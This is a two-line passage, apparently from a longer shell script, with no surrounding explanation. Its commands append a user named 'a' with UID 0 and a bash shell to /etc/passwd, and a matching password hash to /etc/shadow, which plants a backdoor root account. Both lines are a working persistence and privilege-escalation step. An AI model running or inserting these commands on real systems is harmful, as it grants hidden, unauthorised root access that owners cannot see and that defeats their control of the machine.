...
echo "a:x:0:0:root:/root:/bin/bash" >> "/etc/passwd"
echo "a:"'$6$n.wL6L5fViM.hZ.1$fM3ku17l/wNzheT82gSfeVUvFai9B565EldXKwp73KOsQMTFqKXNfMH9Gu67aPg/E2349W9J6XnEVCpCZtDFP0:18946:0:99999:7:::' >> "/etc/shadow"
